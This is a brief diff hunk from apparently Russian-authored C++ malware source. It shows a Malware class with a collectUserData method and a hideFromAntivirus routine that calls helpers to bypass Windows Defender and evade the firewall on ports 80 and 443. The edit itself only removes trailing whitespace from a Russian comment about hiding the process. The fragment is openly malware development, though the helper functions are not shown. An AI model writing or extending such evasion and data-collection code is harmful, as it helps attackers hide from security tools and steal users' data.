@@ -76,7 +76,7 @@ void Malware::collectUserData() {
 
 void Malware::hideFromAntivirus() {
     try {
-        // Скрытие процесса и обход фаервола 
+        // Скрытие процесса и обход фаервола
         StealthUtils::bypassAV("Windows Defender");
         StealthUtils::evadeFirewall({"80", "443"});
         logActivity("Скрытие от антивируса");
